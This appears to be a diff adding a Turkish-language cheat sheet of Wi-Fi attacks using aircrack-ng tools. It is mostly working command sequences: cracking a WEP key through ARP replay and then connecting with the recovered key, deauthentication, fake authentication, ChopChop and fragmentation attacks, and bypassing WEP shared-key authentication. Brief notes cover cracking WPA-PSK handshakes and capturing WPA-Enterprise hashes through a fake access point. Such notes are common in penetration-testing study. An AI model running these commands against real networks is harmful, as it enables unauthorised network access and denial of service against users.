@@ -1,0 +1,146 @@
+CODE	   ATTACK NAME
+ 0	   Deauthentication
+ 1	   Fake Authentication
+ 2	   Interactive Packet Replay
+ 3	   ARP Request Replay Attack
+ 4	   KoreK ChopChop Attack
+ 5	   Fragmentation Attack
+ 6	   Café-Latte Attack
+ 7	   Client-Oriented Fragmentation Attack
+ 8	   WPA Migration Mode Attack
+ 9	   Injection Test
+
+
+### Hazırlık
+```bash
+sudo su
+ip -br -c a
+```
+
+### Monitor Mod + Tarama
+```bash
+sudo airmon-ng start wlan0
+airodump-ng wlan0mon --band abg
+# BSSID, Channel not et
+```
+
+### Paket Yakala
+```bash
+airodump-ng wlan0mon --band abg -c [CHANNEL] --bssid [AP_MAC] -w output_file
+# Client MAC adresini not et (STATION bölümünde)
+```
+
+### ARP Replay Attack
+```bash
+aireplay-ng -3 -b [AP_MAC] -h [CLIENT_MAC] wlan0mon
+# Data sayısı 20.000+ olana kadar bekle
+```
+
+### WEP Key Kır
+```bash
+aircrack-ng output_file-01.cap
+# KEY FOUND! [HEX_KEY] - hex anahtarı kaydet (örn: 3C:E6:13:F0:1D)
+```
+
+### Bağlan
+```bash
+nano wpa_sup.conf
+```
+```
+network={
+    ssid="[SSID]"
+    key_mgmt=NONE
+    wep_key0=[HEX_KEY_NO_COLONS]
+}
+```
+```bash
+airmon-ng stop wlan0mon
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_sup.conf
+# Yeni terminal:
+dhclient wlan0 -v
+```
+
+### curl ile ver ayarı
+
+---
+
+## 📝 HIZLI NOTLAR
+
+### Önemli Bilgiler
+- **WPA-PSK:** Handshake yakala → Wordlist ile kır
+- **WPA-Enterprise:** Sahte AP kur → Hash yakala → Kır
+- **WEP:** ARP replay ile paket çoğalt → Kır (çok hızlı)
+
+### Dikkat Edilecekler
+- Her saldırıda **BSSID** (AP MAC), **Channel**, **Client MAC** kaydet
+- Handshake/Hash yakalanınca **Ctrl+C** ile durdur
+- WEP için minimum **20.000+ paket** gerekli
+- `wpa_supplicant` çalışırken **yeni terminal** aç `dhclient` için
+- Hex anahtarlarda **":"** işaretlerini kaldır
+
+### Sık Kullanılan Parametreler
+- `-0`: Deauth attack
+- `-3`: ARP replay attack
+- `-a`: Access Point MAC
+- `-c`: Client MAC / Channel
+- `-b`: BSSID (AP MAC)
+- `-w`: Output file / Wordlist
+- `-h`: Client MAC (host)
+
+
+# Monitor mode #
+
+   airmon-ng start <interface> <Channel>
+   or
+   ip link <interface> down
+   iw dev <interface> set type monitor
+   ip link <interface> up
+   
+   
+## Deauthentication Attack
+
+   airodump-ng -c <Channel> <interface> -w <captured_file>      
+   macchanger --show <interface>
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                        
+   
+## Fake Authentication Attack
+   
+   airodump-ng -c <Channel> <interface> -w <captured_file>      
+   macchanger --show <interface>
+   aireplay-ng -1 <reassociation timing in seconds> -e <ESSID> -a <AP_MAC> -h <mac> <interface>     
+   #aireplay -1 0 -e testAP -a 13:06:19:94:00:00 -h 02:00:00:00:00:00 wlan0           
+   
+## Interactive Packet Replay Attack
+
+   airmon-ng start <interface> <AP_Channel>                                        
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
+   aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>      # interactive packet replay attack
+                                   
+## ARP Request Replay Attack
+                                        
+   airodump-ng -c <AP_Channel> -w <captured_file> <interface>      
+   aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>                            
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                                                              
+ 
+## Korek ChopChop Attack
+
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <captured_file> <interface>       
+   aireplay-ng -4 -b <AP_MAC> -h <Your_MAC> <interface>                                                              
+
+## Fragmentation Attack
+
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>       
+   aireplay-ng -5 -b <AP_MAC> -h <Your MAC> <interface>                             
+   tcpdump -n -vvv -e -s0 -r <output_file>                                         
+   aireplay-ng -2 -r <output_file> <interface>                                     
+   
+## Bypassing WEP Shared Key Authentication
+   
+   airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>                
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                  
+   aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP_MAC> -h <Your_MAC> <interface> 
+   aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>                                      
+   aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                  
+   aircrack-ng <capture_file>      
+   
